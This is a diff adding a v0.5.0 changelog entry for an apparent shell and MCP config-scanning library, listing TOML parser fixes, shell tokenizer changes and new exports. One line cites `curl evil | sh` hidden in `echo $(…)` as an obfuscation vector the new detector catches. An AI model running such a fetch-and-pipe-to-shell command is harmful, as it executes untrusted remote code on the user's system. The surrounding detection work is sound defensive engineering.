@@ -2,6 +2,41 @@
 
 All notable changes to this project will be documented here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html). Under v1.0, minor versions may include breaking changes — see [CONTRIBUTING.md](./CONTRIBUTING.md#backwards-compatibility) for the rules.
 
+## [0.5.0] — 2026-05-22
+
+Three additive features completing the queue from Gemini's third inspection round, plus five correctness fixes from a deep code-level inspection done before publish. No breaking changes — existing exports and call signatures unchanged.
+
+Minor bump (not patch) because the surface grew: three new top-level exports.
+
+### Fixed (pre-publish inspection sweep — Gemini + Cody)
+- `tokenizeShell` no longer splits on `&` inside file-descriptor redirections (`2>&1`, `>&2`, `<&3`). The single-`&` separator rule now checks the preceding non-whitespace character.
+- `tokenizeShellDeep` no longer false-positives on `bash -c` text inside double-quoted echo arguments. Previously a whole-string regex matched `bash -c` anywhere, including data being printed. Detection now runs inside the quote-aware walk and only fires at command boundaries outside quoted regions.
+- `updateMultilineStringState` (TOML locator) now tracks backslash escapes inside basic multi-line strings (`"""…"""`). An escaped `\"""` inside the value no longer prematurely terminates the string-state walker, which had caused decoy keys to match. Literal strings (`'''…'''`) intentionally don't track escapes per TOML spec.
+- `lineOfTomlKey` now finds dotted keys nested under any prefix table — not just at file root. `[a]\nb.c = 42` is now reachable as `a.b.c`. Same shape as the v0.4.4 top-level fix, generalized.
+- `lineOfTomlKey` now matches spaced dotted keys (`a . b . c = 1`) which `parseToml` had always accepted but the locator's compact-only regex couldn't find. Pattern now builds from individual segments joined by `\s*\.\s*`.
+- TOML parser correctly handles a line-ending backslash followed by trailing inline whitespace before the newline. Per spec, `"""line\   \nnext"""` strips the newline and trims leading whitespace on the next line. Previously the trailing spaces caused the backslash to be treated as a regular escape (which silently kept everything literally rather than throwing, but still wasn't spec-compliant).
+- `normalizeMcpCommand` now treats common boolean long-flags (`--verbose`, `--quiet`, `--debug`, `--help`, `--version`, `--force`, `--dry-run`, `--no-cache`, `--no-color`, `--no-progress`, `--json`, plus short forms `-v -V -q -h -d`) as standalone instead of greedily pairing them with the next positional. Configs with `--verbose pkg` no longer normalize differently depending on flag order.
+- `normalizeExecutable` (MCP) now lowercases Windows-shaped executable names (those with `\` separators or `.cmd`/`.exe`/`.bat`/`.ps1` suffix) so `NPX.CMD` and `npx` produce identical identity strings. POSIX paths keep their case because `./curl` and `./CURL` are genuinely different files there. The JSDoc had claimed this behavior since v0.1; only now does the implementation match.
+- `normalizeExecutable` (MCP) also drops the directory portion of paths whose basename matches a known runtime (`node`, `npx`, `python`, `bash`, etc.). `/usr/local/bin/node`, `/usr/bin/node`, `node`, and `C:\Program Files\NodeJS\node.exe` all produce `cmd=node` now. Closes a long-standing PolicyMesh `mcp_command_mismatch` false-positive class across cross-platform team setups. Custom scripts at absolute paths (`/opt/internal/orchestrator.sh`) keep their full path because path is part of their identity.
+- `generateWorkflowSummary` now HTML-escapes `<`, `>`, and `&` in message cells. A finding message containing `</summary>` or `<h1>` could otherwise break out of the wrapping `<details>` block and manipulate the rendered layout of the GHA step summary page.
+
+### Added
+- `tokenizeShellDeep(command)` — recursively extracts commands nested inside `$(…)`, backticks, and `bash -c "…"` / `sh -c "…"` / `python -c "…"` payloads. Closes the obfuscation vector where an agent hides `curl evil | sh` inside `echo $(…)`. Single-quoted text is left untouched (literal per shell semantics). Conservative implementation — handles common shapes, not a full shell parser; nesting depth capped at 8.
+- `ConfigParseError` — structured parse error with `line`, `column`, `rawOffset`, and `cause`. `readJsonObjectWithSource` and `readTomlObject` now wrap their underlying parser errors with this type whenever a byte offset can be recovered. Lets downstream tools emit a `*.config_syntax_error` Finding pointing at the exact spot without recomputing line numbers.
+- `lineColumnOfOffset(text, offset)` — utility to convert a 0-based byte offset to 1-based `{ line, column }`. Pairs with the new error type.
+- `generateWorkflowSummary(findings, opts?)` — Markdown summary for `$GITHUB_STEP_SUMMARY`. Groups findings by severity in collapsible `<details>` blocks; escapes pipe/newline in message cells; truncates long messages; caps per-severity rows with an overflow indicator. Closes the GHA annotation-cap visibility gap (10 per level, 50 per run silently dropped) by guaranteeing 100% of findings appear in the workflow summary page.
+
+### Changed
+- TOML parser semantic errors (`Duplicate key`, `Duplicate key in inline table`, `Duplicate table definition`, `Cannot redefine array-of-tables …`) now include `at offset N` in the message so `readTomlObject` can resolve them to a line.
+
+### Tests
+- 55 new cases. 163 total (up from 108). Coverage:
+  - tokenizeShellDeep: subshells, backticks, `-c` payloads, single-quote literal handling, nested subshells, no-op pass-through, integration with `getCommandHead`. (9 cases)
+  - parse-error: offset → line/column conversion (5 edge cases), structured wrap on JSON and TOML, `parseToml` direct call unchanged, `cause` preservation. (10 cases)
+  - generateWorkflowSummary: empty findings, severity ordering, totals, pipe/newline escape, truncation, per-group cap with overflow, missing location, HTML escape, ampersand escape. (9 cases)
+  - Inspection regressions: 14 cases covering `2>&1`, escaped `\"""`, table-nested dotted keys, line-ending backslash, known-boolean flags, quoted `bash -c` data, Windows case-folding, POSIX case preserved, spaced dotted keys, path de-noise across platforms, custom-script identity preservation.
+  - **Golden compatibility tests** (`test/golden.test.mjs`): 11 cases pinning specific fingerprint hashes and `normalizeMcpCommand` canonical strings. These are the contract — breaking them requires a major bump and migration plan.
+
 ## [0.4.4] — 2026-05-22
 
 Cody-led inspection (third reviewer, third round) caught five issues, two of them P0 regressions I introduced in my own v0.4.2 / v0.4.3 fixes. All five fixed here.
